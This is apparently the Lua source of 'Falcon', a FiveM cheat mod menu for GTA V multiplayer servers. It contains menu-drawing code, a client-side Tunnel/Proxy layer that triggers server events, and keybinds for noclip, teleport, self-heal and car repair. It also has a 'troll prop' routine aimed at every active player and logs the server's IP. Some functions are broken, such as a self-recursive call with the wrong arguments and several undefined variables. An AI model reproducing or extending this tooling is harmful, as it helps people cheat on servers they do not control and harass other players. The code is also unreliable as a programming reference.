function BeginTextCommandDisplayText(text)
    return Citizen.InvokeNative(0x25FBB336DF1804CB, text) 
end 

function AddTextComponentSubstringPlayerName(text)
    return Citizen.InvokeNative(0x6C188BE134E074AA, text)
end 

function EndTextCommandDisplayText(x, y)
    return Citizen.InvokeNative(0xCD015E5BB0D96A57, x, y)
end 

Falcon = {} 

Falcon.debug = false 

local menus = {} 
local keys = {up = 172, down = 173, left = 174, right = 175, select = 191, back = 202} 
local optionCount = 0 
local currentKey = nil
local currentMenu = nil

local menuWidth = 0.19 -- old version was 0.23
local titleHeight = 0.11
local titleYOffset = 0.03
local titleScale = 1.0

local buttonHeight = 0.038
local buttonFont = 4
local buttonScale = 0.375
local buttonTextXOffset = 0.005
local buttonTextYOffset = 0.0065


local menuWidth = 0.19 -- old version was 0.23
local function debugPrint(text) 
    if Falcon.debug then Citizen.Trace('[Falcon] ' .. tostring(text)) 
    end 
end 

local function setMenuProperty(id, property, value) 
    if id and menus[id] then menus[id][property] = value debugPrint(id .. ' menu property changed: { ' .. tostring(property) .. ', ' .. tostring(value) .. ' }') 
    end 
end 

local function isMenuVisible(id) 
    if id and menus[id] then 
        return menus[id].visible else 
            return false 
        end 
    end
    
local function setMenuVisible(id, visible, holdCurrent) 
    if id and menus[id] then setMenuProperty(id, 'visible', visible) 
        if not holdCurrent and menus[id] then setMenuProperty(id, 'currentOption', 1) end 
        if visible then if id ~= currentMenu and isMenuVisible(currentMenu) then 
            setMenuVisible(currentMenu, false) end 
            currentMenu = id 
        end 
    end 
end 

local function drawText(text, x, y, font, color, scale, center, shadow, alignRight)
    SetTextColour(color.r, color.g, color.b, color.a)
    SetTextFont(font)
    SetTextScale(scale, scale) 
    if shadow then SetTextDropShadow(2, 2, 0, 0, 0) 
    end 
    if menus[currentMenu] then 
        if center then SetTextCentre(center) 
        elseif alignRight then 
            SetTextWrap(menus[currentMenu].x, menus[currentMenu].x + menus[currentMenu].width - buttonTextXOffset)SetTextRightJustify(true) 
        end 
    end 
    BeginTextCommandDisplayText("STRING")AddTextComponentSubstringPlayerName(text)EndTextCommandDisplayText(x, y) 
end 

local function drawRect(x, y, width, height, color)
    DrawRect(x, y, width, height, color.r, color.g, color.b, color.a) 
end 

local function drawTitle() 
    if menus[currentMenu] then 
        local x = menus[currentMenu].x + menus[currentMenu].width / 2 
        local xText = menus[currentMenu].x + menus[currentMenu].width * titleXOffset 
        local y = menus[currentMenu].y + titleHeight * 1 / titleSpacing 
        if menus[currentMenu].titleBackgroundSprite 
        then DrawSprite(menus[currentMenu].titleBackgroundSprite.dict, menus[currentMenu].titleBackgroundSprite.name, x, y, menus[currentMenu].width, titleHeight, 0., 255, 255, 255, 255) 
        else drawRect(x, y, menus[currentMenu].width, titleHeight, menus[currentMenu].titleBackgroundColor) end drawText(menus[currentMenu].title, xText, y - titleHeight / 2 + titleYOffset, menus[currentMenu].titleFont, menus[currentMenu].titleColor, titleScale, true) 
    end 
end 

local function drawSubTitle() 
    if menus[currentMenu] then 
        local x = menus[currentMenu].x + menus[currentMenu].width / 2 
        local y = menus[currentMenu].y + titleHeight + buttonHeight / 2 
        local subTitleColor = {r = menus[currentMenu].titleBackgroundColor.r, g = menus[currentMenu].titleBackgroundColor.g, b = menus[currentMenu].titleBackgroundColor.b, a = 255}drawRect(x, y, menus[currentMenu].width, buttonHeight, menus[currentMenu].subTitleBackgroundColor)
        drawText(menus[currentMenu].subTitle, menus[currentMenu].x + buttonTextXOffset, y - buttonHeight / 2 + buttonTextYOffset, buttonFont, subTitleColor, buttonScale, false) 
        if optionCount > menus[currentMenu].maxOptionCount 
        then drawText(tostring(menus[currentMenu].currentOption) .. ' / ' .. tostring(optionCount), menus[currentMenu].x + menus[currentMenu].width, y - buttonHeight / 2 + buttonTextYOffset, buttonFont, subTitleColor, buttonScale, false, false, true) 
        end 
    end 
end 

local function drawButton(text, subText) 
    local x = menus[currentMenu].x + menus[currentMenu].width / 2 
    local multiplier = nil if menus[currentMenu].currentOption <= menus[currentMenu].maxOptionCount and optionCount <= menus[currentMenu].maxOptionCount then 
        multiplier = optionCount 
    elseif optionCount > menus[currentMenu].currentOption - menus[currentMenu].maxOptionCount and optionCount <= menus[currentMenu].currentOption then 
        multiplier = optionCount - (menus[currentMenu].currentOption - menus[currentMenu].maxOptionCount) 
    end 
    if multiplier then 
        local y = menus[currentMenu].y + titleHeight + buttonHeight + (buttonHeight * multiplier) - buttonHeight / 2 
        local backgroundColor = nil 
        local textColor = nil 
        local subTextColor = nil 
        local shadow = false 
        if menus[currentMenu].currentOption == optionCount 
        then backgroundColor = menus[currentMenu].menuFocusBackgroundColor textColor = menus[currentMenu].menuFocusTextColor subTextColor = menus[currentMenu].menuFocusTextColor else backgroundColor = menus[currentMenu].menuBackgroundColor textColor = menus[currentMenu].menuTextColor subTextColor = menus[currentMenu].menuSubTextColor 
            shadow = true 
        end 
        drawRect(x, y, menus[currentMenu].width, buttonHeight, backgroundColor)drawText(text, menus[currentMenu].x + buttonTextXOffset, y - (buttonHeight / 2) + buttonTextYOffset, buttonFont, textColor, buttonScale, false, shadow) 
        if subText then 
            drawText(subText, menus[currentMenu].x + buttonTextXOffset, y - buttonHeight / 2 + buttonTextYOffset, buttonFont, subTextColor, buttonScale, false, shadow, true) 
        end 
    end 
end 

function Falcon.CreateMenu(id, title)
	--[[Default settings]]
	menus[id] = { }
	menus[id].title = title
	menus[id].subTitle = 'by JoeMoeDinHoeMoe'

	menus[id].visible = false

	menus[id].previousMenu = nil

	menus[id].aboutToBeClosed = false

	menus[id].x = 0.0175
	menus[id].y = 0.025
	menus[id].width = 0.23

	menus[id].currentOption = 1
	menus[id].maxOptionCount = 10

	menus[id].titleFont = 1
	menus[id].titleColor = { r = 0, g = 0, b = 0, a = 255 }
	menus[id].titleBackgroundColor = { r = 0, g = 0, b = 0, a = 255 }
	menus[id].titleBackgroundSprite = nil

    menus[id].menuTextColor = {r = 255, g = 255, b = 255, a = 255}
	menus[id].menuSubTextColor = { r = 0, g = 0, b = 0, a = 10 }
	menus[id].menuFocusTextColor = { r = 155, g = 155, b = 155, a = 255 }
	menus[id].menuFocusBackgroundColor = { r = 0, g = 0, b = 0, a = 255 }
	menus[id].menuBackgroundColor = { r = 55, g = 55, b = 55, a = 255 }

	menus[id].subTitleBackgroundColor = { r = 35, g = 35, b = 35, a = 255 }

	menus[id].buttonPressedSound = { name = "SELECT", set = "HUD_FRONTEND_DEFAULT_SOUNDSET" } --[[https://pastebin.com/0neZdsZ5]]

	debugPrint(tostring(id)..' menu created')
end

function Falcon.CreateSubMenu(id, parent, subTitle) 
    if menus[parent] then 
        Falcon.CreateMenu(id, menus[parent].title) 
        if subTitle then 
            setMenuProperty(id, 'subTitle', string.upper(subTitle)) else 
                setMenuProperty(id, 'subTitle', string.upper(menus[parent].subTitle)) 
            end 
            setMenuProperty(id, 'previousMenu', parent)setMenuProperty(id, 'x', menus[parent].x)
            setMenuProperty(id, 'y', menus[parent].y)
            setMenuProperty(id, 'maxOptionCount', menus[parent].maxOptionCount)
            setMenuProperty(id, 'titleFont', menus[parent].titleFont)
            setMenuProperty(id, 'titleColor', menus[parent].titleColor)
            setMenuProperty(id, 'titleBackgroundColor', menus[parent].titleBackgroundColor)
            setMenuProperty(id, 'titleBackgroundSprite', menus[parent].titleBackgroundSprite)
            setMenuProperty(id, 'menuTextColor', menus[parent].menuTextColor)
            setMenuProperty(id, 'menuSubTextColor', menus[parent].menuSubTextColor)
            setMenuProperty(id, 'menuFocusTextColor', menus[parent].menuFocusTextColor)
            setMenuProperty(id, 'menuFocusBackgroundColor', menus[parent].menuFocusBackgroundColor)
            setMenuProperty(id, 'menuBackgroundColor', menus[parent].menuBackgroundColor)
            setMenuProperty(id, 'subTitleBackgroundColor', menus[parent].subTitleBackgroundColor) else debugPrint('Failed to create ' .. tostring(id) .. ' submenu: ' .. tostring(parent) .. ' parent menu doesn\'t exist') 
            end 
        end 
        
        function Falcon.CurrentMenu() 
            return currentMenu 
        end

            function Falcon.OpenMenu(id) 
                if id and menus[id] then 
                    PlaySoundFrontend(-1, "SELECT", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)setMenuVisible(id, true)debugPrint(tostring(id) .. ' menu opened') else 
                        debugPrint('Failed to open ' .. tostring(id) .. ' menu: it doesn\'t exist') 
                    end 
                end 
                
                function Falcon.IsMenuOpened(id) 
                    return isMenuVisible(id) 
                end 
                    
                function Falcon.IsAnyMenuOpened() 
                    for id, _ in pairs(menus) do 
                        if isMenuVisible(id) then 
                            return true 
                        end 
                    end 
                
                    return false 
                end 
                
                function Falcon.IsMenuAboutToBeClosed() 
                    if menus[currentMenu] then 
                        return menus[currentMenu].aboutToBeClosed else 
                            return false 
                        end 
                    end 
                    
                    function Falcon.CloseMenu() 
                        if menus[currentMenu] then 
                            if menus[currentMenu].aboutToBeClosed 
                            then menus[currentMenu].aboutToBeClosed = false 
                                setMenuVisible(currentMenu, false)
                                debugPrint(tostring(currentMenu) .. ' menu closed')
                                PlaySoundFrontend(-1, "QUIT", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
                                optionCount = 0 
                                currentMenu = nil 
                                currentKey = nil else 
                                    menus[currentMenu].aboutToBeClosed = true 
                                    debugPrint(tostring(currentMenu) .. ' menu about to be closed') 
                                end 
                            end 
                        end 
                        
                        function Falcon.Button(text, subText) 
                            local buttonText = text 
                            if subText then 
                                buttonText = '{ ' .. tostring(buttonText) .. ', ' .. tostring(subText) .. ' }' 
                            end 
                            if menus[currentMenu] then 
                                optionCount = optionCount + 1 
                                local isCurrent = menus[currentMenu].currentOption == optionCount 
                                drawButton(text, subText) 
                                if isCurrent then 
                                    if currentKey == keys.select then 
                                        PlaySoundFrontend(-1, menus[currentMenu].buttonPressedSound.name, menus[currentMenu].buttonPressedSound.set, true)debugPrint(buttonText .. ' button pressed') 
                                        return true 
                                    elseif currentKey == keys.left or currentKey == keys.right then 
                                        PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true) 
                                    end 
                                end 
                                return false 
                            else 
                                debugPrint('Failed to create ' .. buttonText .. ' button: ' .. tostring(currentMenu) .. ' menu doesn\'t exist') 
                                return false 
                            end 
                        end 
                        
                        function Falcon.MenuButton(text, id) 
                            if menus[id] then 
                                if Falcon.Button(text .. themecolor .. "   " .. themearrow) then 
                                    setMenuVisible(currentMenu, false)setMenuVisible(id, true, true) 
                                    return true 
                                end 
                            else 
                                debugPrint('Failed to create ' .. tostring(text) .. ' menu button: ' .. tostring(id) .. ' submenu doesn\'t exist') 
                            end 
                            return false 
                        end 
                        
                        function Falcon.CheckBox(text, checked, offtext, ontext, callback) 
                            if not offtext then 
                                offtext = "Off" 
                            end 
                            if not ontext then 
                                ontext = "On" 
                            end 
                            if Falcon.Button(text, checked and ontext or offtext) 
                            then checked = not checked debugPrint(tostring(text) .. ' checkbox changed to ' .. tostring(checked)) 
                                if callback then 
                                    callback(checked) 
                                end 
                                return true 
                            end 
                            return false 
                        end 
                        
                        function Falcon.ComboBox(text, items, currentIndex, selectedIndex, callback) 
                            local itemsCount = #items 
                            local selectedItem = items[currentIndex] 
                            local isCurrent = menus[currentMenu].currentOption == (optionCount + 1) 
                            if itemsCount > 1 and isCurrent then selectedItem = tostring(selectedItem) 
                            end 
                            if Falcon.Button(text, selectedItem) 
                            then selectedIndex = currentIndex callback(currentIndex, selectedIndex) 
                                return true 
                            elseif isCurrent then if currentKey == keys.left then 
                                if currentIndex > 1 then currentIndex = currentIndex - 1 
                                else 
                                    currentIndex = itemsCount 
                                end 
                            elseif currentKey == keys.right then 
                                if currentIndex < itemsCount then 
                                    currentIndex = currentIndex + 1 
                                else 
                                    currentIndex = 1 
                                end 
                            end 
                        else currentIndex = selectedIndex 
                        end 
                        callback(currentIndex, selectedIndex) 
                        return false 
                    end 
                    
                    function Falcon.Display() 
                        if isMenuVisible(currentMenu) then 
                            if menus[currentMenu].aboutToBeClosed then 
                                Falcon.CloseMenu() 
                            else 
                                ClearAllHelpMessages()drawTitle()drawSubTitle()currentKey = nil 
                                if IsDisabledControlJustReleased(1, keys.down) 
                                then PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true) 
                                    if menus[currentMenu].currentOption < optionCount then 
                                        menus[currentMenu].currentOption = menus[currentMenu].currentOption + 1 
                                    else 
                                        menus[currentMenu].currentOption = 1 end 
                                    elseif 
                                    IsDisabledControlJustReleased(1, keys.up) then 
                                        PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true) 
                                        if menus[currentMenu].currentOption > 1 then 
                                            menus[currentMenu].currentOption = menus[currentMenu].currentOption - 1 
                                        else 
                                            menus[currentMenu].currentOption = optionCount 
                                        end 
                                    elseif IsDisabledControlJustReleased(1, keys.left) then 
                                        currentKey = keys.left 
                                    elseif IsDisabledControlJustReleased(1, keys.right) then 
                                        currentKey = keys.right 
                                    elseif IsDisabledControlJustReleased(1, keys.select) then 
                                        currentKey = keys.select 
                                    elseif IsDisabledControlJustReleased(1, keys.back) then 
                                        if menus[menus[currentMenu].previousMenu] then 
                                            PlaySoundFrontend(-1, "BACK", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
                                            setMenuVisible(menus[currentMenu].previousMenu, true) 
                                        else 
                                            Falcon.CloseMenu() 
                                        end 
                                    end 
                                    optionCount = 0 
                                end 
                            end 
                        end 
                        
                        function Falcon.SetMenuWidth(id, width)
                            setMenuProperty(id, 'width', width) 
                        end 
                        
                        function Falcon.SetMenuX(id, x)
                            setMenuProperty(id, 'x', x) 
                        end 
                        
                        function Falcon.SetMenuY(id, y)
                            setMenuProperty(id, 'y', y) 
                        end 
                        
                        function 
                            Falcon.SetMenuMaxOptionCountOnScreen(id, count)
                            setMenuProperty(id, 'maxOptionCount', count) 
                        end 
                        
                        function Falcon.SetTitle(id, title)
                            setMenuProperty(id, 'title', title) 
                        end 
                        
                        function Falcon.SetTitleColor(id, r, g, b, a)
                            setMenuProperty(id, 'titleColor', {['r'] = r, ['g'] = g, ['b'] = b, ['a'] = a or menus[id].titleColor.a}) 
                        end 
                        
                        function Falcon.SetTitleBackgroundColor(id, r, g, b, a)
                            setMenuProperty(id, 'titleBackgroundColor', {['r'] = r, ['g'] = g, ['b'] = b, ['a'] = a or menus[id].titleBackgroundColor.a}) 
                        end 
                        
                        function Falcon.SetTitleBackgroundSprite(id, textureDict, textureName)
                            RequestStreamedTextureDict(textureDict)setMenuProperty(id, 'titleBackgroundSprite', {dict = textureDict, name = textureName}) 
                        end 
                        
                        function Falcon.SetSubTitle(id, text)
                            setMenuProperty(id, 'subTitle', string.upper(text)) 
                        end 
                        
                        function Falcon.SetMenuBackgroundColor(id, r, g, b, a)
                            setMenuProperty(id, 'menuBackgroundColor', {['r'] = r, ['g'] = g, ['b'] = b, ['a'] = a or menus[id].menuBackgroundColor.a}) 
                        end 
                        
                        function Falcon.SetMenuTextColor(id, r, g, b, a)
                            setMenuProperty(id, 'menuTextColor', {['r'] = r, ['g'] = g, ['b'] = b, ['a'] = a or menus[id].menuTextColor.a}) 
                        end 
                        
                        function Falcon.SetMenuSubTextColor(id, r, g, b, a)
                            setMenuProperty(id, 'menuSubTextColor', {['r'] = r, ['g'] = g, ['b'] = b, ['a'] = a or menus[id].menuSubTextColor.a}) 
                        end 
                        
                        function Falcon.SetMenuFocusColor(id, r, g, b, a)
                            setMenuProperty(id, 'menuFocusColor', {['r'] = r, ['g'] = g, ['b'] = b, ['a'] = a or menus[id].menuFocusColor.a}) 
                        end 
                        
                        function Falcon.SetMenuButtonPressedSound(id, name, set)
                            setMenuProperty(id, 'buttonPressedSound', {['name'] = name, ['set'] = set}) 
                        end 
                        
                        Tools = {} 
                        
                        local IDGenerator = {} 
                        
                        function Tools.newIDGenerator() 
                            local r = setmetatable({}, {__index = IDGenerator})r:construct() 
                            return r 
                        end 
                        
                        function IDGenerator:construct()
                            self:clear() 
                        end 
                        
                        function IDGenerator:clear()
                            self.max = 0 self.ids = {} 
                        end 
                        
                        function IDGenerator:gen() 
                            if #self.ids > 0 then 
                                return 
                                table.remove(self.ids) 
                            else 
                                local r = self.max self.max = self.max + 1 
                                return r 
                            end 
                        end 
                        
                        function IDGenerator:free(id)
                            table.insert(self.ids, id) 
                        end 
                        
                        Tunnel = {} 
                        
                        local function tunnel_resolve(itable, key) 
                            local mtable = getmetatable(itable) 
                            local iname = mtable.name 
                            local ids = mtable.tunnel_ids 
                            local callbacks = mtable.tunnel_callbacks 
                            local identifier = mtable.identifier 
                            local fcall = function(args, callback) 
                                if args == nil then args = {} 
                                end if type(callback) == "function" then 
                                    local rid = ids:gen()
                                    callbacks[rid] = callback 
                                    TriggerServerEvent(iname .. ":tunnel_req", key, args, identifier, rid) 
                                else 
                                    TriggerServerEvent(iname .. ":tunnel_req", key, args, "", -1) 
                                end 
                            end itable[key] = fcall 
                            return 
                            fcall 
                        end 
                        
                        function Tunnel.bindInterface(name, interface)
                            RegisterNetEvent(name .. ":tunnel_req")
                            AddEventHandler(name .. ":tunnel_req", function(member, args, identifier, rid) 
                                local f = interface[member] 
                                local delayed = false 
                                local rets = {} if type(f) == "function" then 
                                    TUNNEL_DELAYED = function()delayed = true 
                                        return 
                                        function(rets)rets = rets or {} if rid >= 0 then 
                                            TriggerServerEvent(name .. ":" .. identifier .. ":tunnel_res", rid, rets) 
                                        end 
                                    end 
                                end 
                                rets = {f(table.unpack(args))} 
                            end 
                            if not delayed and rid >= 0 then 
                                TriggerServerEvent(name .. ":" .. identifier .. ":tunnel_res", rid, rets) 
                            end 
                        end) 
                    end 
                    
                    function Tunnel.getInterface(name, identifier) 
                        local ids = Tools.newIDGenerator() 
                        local callbacks = {} 
                        local r = setmetatable({}, {__index = tunnel_resolve, name = name, tunnel_ids = ids, tunnel_callbacks = callbacks, identifier = identifier})
                        RegisterNetEvent(name .. ":" .. identifier .. ":tunnel_res")AddEventHandler(name .. ":" .. identifier .. ":tunnel_res", function(rid, args) 
                            local callback = callbacks[rid] 
                            if callback ~= nil then 
                                ids:free(rid)callbacks[rid] = nil callback(table.unpack(args)) 
                            end 
                        end) 
                        return 
                        r 
                    end 
                    
                    Proxy = {} 
                    local proxy_rdata = {} 
                    
                    local function proxy_callback(rvalues)
                        proxy_rdata = rvalues 
                    end 
                    
                    local function proxy_resolve(itable, key) 
                        local iname = getmetatable(itable).name 
                        local fcall = function(args, callback) 
                            if args == nil then args = {} 
                            end 
                            TriggerEvent(iname .. ":proxy", key, args, proxy_callback) 
                            return 
                            table.unpack(proxy_rdata) 
                        end itable[key] = fcall 
                        return 
                        fcall 
                    end 
                    
                    function Proxy.addInterface(name, itable)
                        AddEventHandler(name .. ":proxy", function(member, args, callback) 
                            local f = itable[member] 
                            if type(f) == "function" then 
                                callback({f(table.unpack(args))}) 
                            else 
                            end 
                        end) 
                    end 
                    
                    function Proxy.getInterface(name) 
                        local r = setmetatable({}, {__index = proxy_resolve, name = name}) 
                        return 
                        r 
                    end

noclipKeybind = "F13"		
teleportKeyblind = "NONE"
fixvaiculoKeyblind = "NONE"
healmeckbind = "F3"
menuKeybind = "F7" -- Key to open the menu.


menuName = "Falcon"
version = "~r~v7.2" 
theme = "Falcon"
themes = {"Falcon", "basic", "dark", "infamous"}

mpMessage = true
startMessage = "~b~¦~s~💙 DIT SVIN ~n~👤 USER → ~b~[~s~ " ..GetPlayerName(PlayerId()).. " ~b~]"	
subMessage = "~n~~w~🔒 OPEN MENU ~r~F7🔒"
motd2 = "Key ~b~*" ..teleportKeyblind.."* ~w~TeleportOnWaypoint"
motd4 = "Key ~b~*" ..healmeckbind.."* ~w~Heal your self"
motd = "Key ~b~*" ..noclipKeybind.."* ~w~Noclip!"
motd5 = "Key ~b~*" ..fixvaiculoKeyblind.."* ~w~Car Fix" 
motd3 = "~r~Main Developer ~b~#1325"

print('Information')
print('IP: '..GetCurrentServerEndpoint())
print('Resource: '..GetCurrentResourceName())
print('Welcome to my paste :D -JoeMoeDinHoeMoe')


--==================================================================================================================================================--
--[[ Falcon Functions ]]
--==================================================================================================================================================--

Falcon.Exia = {}

Falcon.Exia.spawnTrollProp = function(prop)
	local plist = GetActivePlayers()
	for i = 0, #plist do
		Falcon.Exia.spawnTrollProp(GetPlayerPed(i), prop)
	end
end


--==================================================================================================================================================--
--[[ FiveM Functions ]]
--==================================================================================================================================================--

FiveM = {}
do
    
    NotificationType = {
        None = 0,
        Info = 1,
        Error = 2,
        Alert = 3,
        Success = 4
    }

    FiveM.Notify = function(text, type)
        if type == nil then type = NotificationType.None end
        SetNotificationTextEntry("STRING")
        if type == NotificationType.Info then
            AddTextComponentString("~b~~h~Info~h~~s~: " .. text)
        elseif type == NotificationType.Error then
            AddTextComponentString("~r~~h~Error~h~~s~: " .. text)
        elseif type == NotificationType.Alert then
            AddTextComponentString("~y~~h~Alert~h~~s~: " .. text)
        elseif type == NotificationType.Success then
            AddTextComponentString("~g~~h~Success~h~~s~: " .. text)
        else
            AddTextComponentString(text)
        end
        DrawNotification(false, false)
    end

    Falcon.Toggle = {
        SelfRagdoll = false,
        VehicleNoFall = false,
    }

    FiveM.PushNotification = function(text, ms)
        if text then
            if not ms then ms = 5000 end
            FiveM.AddNotification(text, ms)
        end
    end

    FiveM.AddNotification = function(text, ms)
        table.insert(cachedNotifications, { ["text"] = text, ["time"] = ms, ["startTime"] = GetGameTimer() })
    end

    FiveM.Subtitle = function(message, duration, drawImmediately)
        if duration == nil then duration = 2500 end;
        if drawImmediately == nil then drawImmediately = true; end;
        ClearPrints()
        SetTextEntry_2("STRING");
        for i = 1, message:len(), 99 do
            AddTextComponentString(string.sub(message, i, i + 99))
        end
        DrawSubtitleTimed(duration, drawImmediately);
    end

    FiveM.Subtitle2 = function(message, duration, drawImmediately)
        if duration == nil then duration = 6000 end;
        if drawImmediately == nil then drawImmediately = true; end;
        ClearPrints()
        SetTextEntry_2("STRING");
        for i = 1, message:len(), 99 do
            AddTextComponentString(string.sub(message, i, i + 99))
        end
        DrawSubtitleTimed(duration, drawImmediately);
    end

    FiveM.GetKeyboardInput = function(TextEntry, ExampleText, MaxStringLength)
        AddTextEntry("FMMC_KEY_TIP1", TextEntry .. ":")
        DisplayOnscreenKeyboard(1, "FMMC_KEY_TIP1", "", ExampleText, "", "", "", MaxStringLength)
        local blockinput = true
        while UpdateOnscreenKeyboard() ~= 1 and UpdateOnscreenKeyboard() ~= 2 do Citizen.Wait(0) end

        if UpdateOnscreenKeyboard() ~= 2 then
            local result = GetOnscreenKeyboardResult()
            Citizen.Wait(500)
            blockinput = false
            return result
        else
            Citizen.Wait(500)
            blockinput = false
            return nil
        end
    end

    FiveM.GetVehicleProperties = function(vehicle)
        local color1, color2 = GetVehicleColours(vehicle)
        local pearlescentColor, wheelColor = GetVehicleExtraColours(vehicle)
        local extras = {}

        for id = 0, 12 do
            if DoesExtraExist(vehicle, id) then
                local state = IsVehicleExtraTurnedOn(vehicle, id) == 1
                extras[tostring(id)] = state
            end
        end

        return {
            model = GetEntityModel(vehicle),

            plate = math.trim(GetVehicleNumberPlateText(vehicle)),
            plateIndex = GetVehicleNumberPlateTextIndex(vehicle),

            health = GetEntityMaxHealth(vehicle),
            dirtLevel = GetVehicleDirtLevel(vehicle),

            color1 = color1,
            color2 = color2,

            pearlescentColor = pearlescentColor,
            wheelColor = wheelColor,

            wheels = GetVehicleWheelType(vehicle),
            windowTint = GetVehicleWindowTint(vehicle),

            neonEnabled = {
                IsVehicleNeonLightEnabled(vehicle, 0), IsVehicleNeonLightEnabled(vehicle, 1), IsVehicleNeonLightEnabled(vehicle, 2),
                IsVehicleNeonLightEnabled(vehicle, 3)
            },

            extras = extras,

            neonColor = table.pack(GetVehicleNeonLightsColour(vehicle)),
            tyreSmokeColor = table.pack(GetVehicleTyreSmokeColor(vehicle)),

            modSpoilers = GetVehicleMod(vehicle, 0),
            modFrontBumper = GetVehicleMod(vehicle, 1),
            modRearBumper = GetVehicleMod(vehicle, 2),
            modSideSkirt = GetVehicleMod(vehicle, 3),
            modExhaust = GetVehicleMod(vehicle, 4),
            modFrame = GetVehicleMod(vehicle, 5),
            modGrille = GetVehicleMod(vehicle, 6),
            modHood = GetVehicleMod(vehicle, 7),
            modFender = GetVehicleMod(vehicle, 8),
            modRightFender = GetVehicleMod(vehicle, 9),
            modRoof = GetVehicleMod(vehicle, 10),

            modEngine = GetVehicleMod(vehicle, 11),
            modBrakes = GetVehicleMod(vehicle, 12),
            modTransmission = GetVehicleMod(vehicle, 13),
            modHorns = GetVehicleMod(vehicle, 14),
            modSuspension = GetVehicleMod(vehicle, 15),
            modArmor = GetVehicleMod(vehicle, 16),

            modTurbo = IsToggleModOn(vehicle, 18),
            modSmokeEnabled = IsToggleModOn(vehicle, 20),
            modXenon = IsToggleModOn(vehicle, 22),

            modFrontWheels = GetVehicleMod(vehicle, 23),
            modBackWheels = GetVehicleMod(vehicle, 24),

            modPlateHolder = GetVehicleMod(vehicle, 25),
            modVanityPlate = GetVehicleMod(vehicle, 26),
            modTrimA = GetVehicleMod(vehicle, 27),
            modOrnaments = GetVehicleMod(vehicle, 28),
            modDashboard = GetVehicleMod(vehicle, 29),
            modDial = GetVehicleMod(vehicle, 30),
            modDoorSpeaker = GetVehicleMod(vehicle, 31),
            modSeats = GetVehicleMod(vehicle, 32),
            modSteeringWheel = GetVehicleMod(vehicle, 33),
            modShifterLeavers = GetVehicleMod(vehicle, 34),
            modAPlate = GetVehicleMod(vehicle, 35),
            modSpeakers = GetVehicleMod(vehicle, 36),
            modTrunk = GetVehicleMod(vehicle, 37),
            modHydrolic = GetVehicleMod(vehicle, 38),
            modEngineBlock = GetVehicleMod(vehicle, 39),
            modAirFilter = GetVehicleMod(vehicle, 40),
            modStruts = GetVehicleMod(vehicle, 41),
            modArchCover = GetVehicleMod(vehicle, 42),
            modAerials = GetVehicleMod(vehicle, 43),
            modTrimB = GetVehicleMod(vehicle, 44),
            modTank = GetVehicleMod(vehicle, 45),
            modWindows = GetVehicleMod(vehicle, 46),
            modLivery = GetVehicleLivery(vehicle)
        }
    end

    FiveM.SetVehicleProperties = function(vehicle, props)
        SetVehicleModKit(vehicle, 0)

        if props.plate ~= nil then SetVehicleNumberPlateText(vehicle, props.plate) end

        if props.plateIndex ~= nil then SetVehicleNumberPlateTextIndex(vehicle, props.plateIndex) end

        if props.health ~= nil then SetEntityHealth(vehicle, props.health) end

        if props.dirtLevel ~= nil then SetVehicleDirtLevel(vehicle, props.dirtLevel) end

        if props.color1 ~= nil then
            local color1, color2 = GetVehicleColours(vehicle)
            SetVehicleColours(vehicle, props.color1, color2)
        end

        if props.color2 ~= nil then
            local color1, color2 = GetVehicleColours(vehicle)
            SetVehicleColours(vehicle, color1, props.color2)
        end

        if props.pearlescentColor ~= nil then
            local pearlescentColor, wheelColor = GetVehicleExtraColours(vehicle)
            SetVehicleExtraColours(vehicle, props.pearlescentColor, wheelColor)
        end

        if props.wheelColor ~= nil then
            local pearlescentColor, wheelColor = GetVehicleExtraColours(vehicle)
            SetVehicleExtraColours(vehicle, pearlescentColor, props.wheelColor)
        end

        if props.wheels ~= nil then SetVehicleWheelType(vehicle, props.wheels) end

        if props.windowTint ~= nil then SetVehicleWindowTint(vehicle, props.windowTint) end

        if props.neonEnabled ~= nil then
            SetVehicleNeonLightEnabled(vehicle, 0, props.neonEnabled[1])
            SetVehicleNeonLightEnabled(vehicle, 1, props.neonEnabled[2])
            SetVehicleNeonLightEnabled(vehicle, 2, props.neonEnabled[3])
            SetVehicleNeonLightEnabled(vehicle, 3, props.neonEnabled[4])
        end

        if props.extras ~= nil then
            for id, enabled in pairs(props.extras) do
                if enabled then
                    SetVehicleExtra(vehicle, tonumber(id), 0)
                else
                    SetVehicleExtra(vehicle, tonumber(id), 1)
                end
            end
        end

        if props.neonColor ~= nil then SetVehicleNeonLightsColour(vehicle, props.neonColor[1], props.neonColor[2], props.neonColor[3]) end

        if props.modSmokeEnabled ~= nil then ToggleVehicleMod(vehicle, 20, true) end

        if props.tyreSmokeColor ~= nil then
            SetVehicleTyreSmokeColor(vehicle, props.tyreSmokeColor[1], props.tyreSmokeColor[2], props.tyreSmokeColor[3])
        end

        if props.modSpoilers ~= nil then SetVehicleMod(vehicle, 0, props.modSpoilers, false) end

        if props.modFrontBumper ~= nil then SetVehicleMod(vehicle, 1, props.modFrontBumper, false) end

        if props.modRearBumper ~= nil then SetVehicleMod(vehicle, 2, props.modRearBumper, false) end

        if props.modSideSkirt ~= nil then SetVehicleMod(vehicle, 3, props.modSideSkirt, false) end

        if props.modExhaust ~= nil then SetVehicleMod(vehicle, 4, props.modExhaust, false) end

        if props.modFrame ~= nil then SetVehicleMod(vehicle, 5, props.modFrame, false) end

        if props.modGrille ~= nil then SetVehicleMod(vehicle, 6, props.modGrille, false) end

        if props.modHood ~= nil then SetVehicleMod(vehicle, 7, props.modHood, false) end

        if props.modFender ~= nil then SetVehicleMod(vehicle, 8, props.modFender, false) end

        if props.modRightFender ~= nil then SetVehicleMod(vehicle, 9, props.modRightFender, false) end

        if props.modRoof ~= nil then SetVehicleMod(vehicle, 10, props.modRoof, false) end

        if props.modEngine ~= nil then SetVehicleMod(vehicle, 11, props.modEngine, false) end

        if props.modBrakes ~= nil then SetVehicleMod(vehicle, 12, props.modBrakes, false) end

        if props.modTransmission ~= nil then SetVehicleMod(vehicle, 13, props.modTransmission, false) end

        if props.modHorns ~= nil then SetVehicleMod(vehicle, 14, props.modHorns, false) end

        if props.modSuspension ~= nil then SetVehicleMod(vehicle, 15, props.modSuspension, false) end

